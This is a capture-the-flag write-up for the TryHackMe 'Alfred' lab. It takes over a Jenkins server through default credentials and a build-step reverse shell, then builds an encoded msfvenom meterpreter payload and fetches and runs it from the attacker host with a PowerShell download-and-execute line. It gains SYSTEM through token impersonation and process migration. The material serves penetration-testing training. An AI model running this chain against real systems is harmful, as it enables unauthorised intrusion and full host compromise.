## TryHackMe Alfred
---

Link to TryHackMe Room: https://tryhackme.com/room/alfred 

- Machine does not respond to ICMP
- Using Nishang to gain initial access

Task 1: Initial Access
```
$ nmap -sV -sC 10.10.242.101 -oA recon/alfred-scan

Nmap scan report for 10.10.242.101
Host is up (0.11s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft IIS httpd 7.5
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
3389/tcp open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: ALFRED
|   NetBIOS_Domain_Name: ALFRED
|   NetBIOS_Computer_Name: ALFRED
|   DNS_Domain_Name: alfred
|   DNS_Computer_Name: alfred
|   Product_Version: 6.1.7601
|_  System_Time: 2021-11-05T19:31:43+00:00
|_ssl-date: 2021-11-05T19:31:45+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=alfred
| Not valid before: 2021-11-04T19:28:55
|_Not valid after:  2022-05-06T19:28:55
8080/tcp open  http               Jetty 9.4.z-SNAPSHOT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Site doesn't have a title (text/html;charset=utf-8).
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

$ firefox 10.10.242.101:8080
# default username:password is admin:admin
```
- The system is known Microsoft Server (Port 80 is IIS)
- To get reverse shell inside of Jenkins
	- > Left-hand bar > New Item
	- > Give Project a name
	- > Freestyle Project
	- > Scroll down to Build
	- > Select Windows Batch Command
	- > (Refer to Quick Resources > Invoke Reverse Shell from Py Web Server)
	- > Save & Apple
	- > Build Now, it should continue running indefinitely

```
$ nc -lvnp 8182

Connection from 10.10.242.101:49240
Windows PowerShell running as user bruce on ALFRED
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Program Files (x86)\Jenkins\workspace\test3>dir
PS C:\Program Files (x86)\Jenkins\workspace\test3> cd C:\Users
PS C:\Users> dir


Directory: C:\Users


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----        10/25/2019   8:05 PM            bruce
d----        10/25/2019  10:21 PM            DefaultAppPool
d-r--        11/21/2010   7:16 AM            Public                            


PS C:\Users> cd bruce
PS C:\Users\bruce> cd Desktop
PS C:\Users\bruce\Desktop> dir


Directory: C:\Users\bruce\Desktop


Mode                LastWriteTime     Length Name
----                -------------     ------ ----
-a---        10/25/2019  11:22 PM         32 user.txt                          


PS C:\Users\bruce\Desktop> type user.txt
79007{REDACTED}
PS C:\Users\bruce\Desktop> 
```

Task 2: Switching Shells

- Using meterpreter to switch from nc shell to meterpreter
- Using msfvenom exploit

```
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.82.216 LPORT=8888 -f exe -o purple_drink.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders                                         
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai 
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes         
Saved as: purple_drink.exe
```

- Next step is to use the previously gained shell to download and run this script
- Run msf handler as well



#### LINUX

```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcppayload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => 10.6.82.216
msf6 exploit(multi/handler) > set lport 8888
lport => 8888
msf6 exploit(multi/handler) > run
```

#### Windows NC Shell

```
PS C:\Users\bruce\Desktop> powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.6.82.216:8000/purple_drink.exe', 'purple_drink.exe')"
PS C:\Users\bruce\Desktop> Start-Process 'purple_drink.exe'
PS C:\Users\bruce\Desktop> 
```

### LINUX

```
[*] Started reverse TCP handler on 10.6.82.216:8888 
[*] Sending stage (175174 bytes) to 10.10.242.101[*] Meterpreter session 1 opened (10.6.82.216:8888 -> 10.10.242.101:49264) at 2021-11-05 16:39:07 -0400

meterpreter > 
		
```

#### Step 3: Privilege Escalation

```
#### Windows

PS C:\Users\bruce\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        DisabledSeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             DisabledSeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
PS C:\Users\bruce\Desktop> 

### Linux

meterpreter > list_tokens -g

Delegation Tokens Available
========================================
\   
BUILTIN\Administrators                    
BUILTIN\IIS_IUSRS          
BUILTIN\Users               
NT AUTHORITY\Authenticated Users                  
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization           
NT AUTHORITY\WRITE RESTRICTED  
NT SERVICE\AppHostSvc
NT SERVICE\AudioEndpointBuilder
NT SERVICE\BFE     
NT SERVICE\CertPropSvc 
NT SERVICE\CscService
NT SERVICE\Dnscache
NT SERVICE\eventlog  
NT SERVICE\EventSystem
NT SERVICE\FDResPub
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\MMCSSNT SERVICE\PcaSvc
NT SERVICE\PlugPlay
NT SERVICE\RpcEptMapper
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\Spooler
NT SERVICE\TrkWks
NT SERVICE\TrustedInstallerNT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\WSearch
NT SERVICE\wuauserv

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPSNT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\NlaSvc
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\ShellHWDetection
NT SERVICE\TermService
NT SERVICE\wscsvc

meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM

meterpreter > ps 
Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 396   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe 524   516   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 540   524   conhost.exe           x64   0        alfred\bruce                  C:\Windows\System32\conhost.exe
 572   564   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
 580   516   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
 608   564   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 668   580   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
 676   580   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 684   580   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
 772   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe 852   668   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 868   668   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 924   608   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
 940   668   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe

 -- SNIP --
```

```

meterpreter > migrate 668

[*] Migrating from 2612 to 668...

[*] Migration completed successfully.

meterpreter >

meterpreter > pwd

C:\Windows\system32

meterpreter > cd config

meterpreter > cat root.txt

dff0f{REDACTED}

meterpreter > 
```

## Complete
		